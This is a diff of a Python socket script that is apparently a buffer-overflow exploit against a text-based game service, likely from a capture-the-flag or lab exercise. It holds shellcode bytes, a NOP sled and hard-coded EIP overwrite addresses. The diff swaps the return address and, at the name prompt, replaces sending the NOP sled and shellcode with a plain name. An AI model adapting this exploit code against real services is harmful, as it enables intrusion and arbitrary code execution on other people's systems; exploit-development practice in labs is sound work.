@@ -31,16 +31,15 @@ calc += b"\x78\x65\x00"
 
 #new_eip = struct.pack("<I", 0x0062F0DA)
 #new_eip = struct.pack("<I", 0x00D237E0)
-new_eip = struct.pack("<I", 0x00401447)
+new_eip = struct.pack("<I", 0x00401489)
 
 nop_sled = b"\x90" * 32
 
 data = s.recv(1024)
 decoded = data.decode()
+print(decoded)
 
 while len(decoded) != 0:
-    
-    print(decoded)
     
     if decoded.__contains__("Play the game"):
         msg = "1"
@@ -50,9 +49,9 @@ while len(decoded) != 0:
     if decoded.__contains__("pick a name"):  
         msg = "jack"      
         print(f">>> Sending {msg}\n")
-        s.send(nop_sled + calc)
+        s.send(msg.encode())
 
-    if decoded.__contains__("Ale, of course!"):
+    if decoded.__contains__("Ale"):
         msg = "1"
         print(f">>> Sending {msg}\n")
         s.send(msg.encode())
@@ -74,10 +73,10 @@ while len(decoded) != 0:
         print(f">>> Sending {msg}\n")
         s.send(msg.encode())
 
-    try:        
-        data = s.recv(1024)
+    try:
+        data = s.recv(4096)
         decoded = data.decode()
-        time.sleep(1)
+        print(decoded)
     except:
         data = 0
         decoded = ""
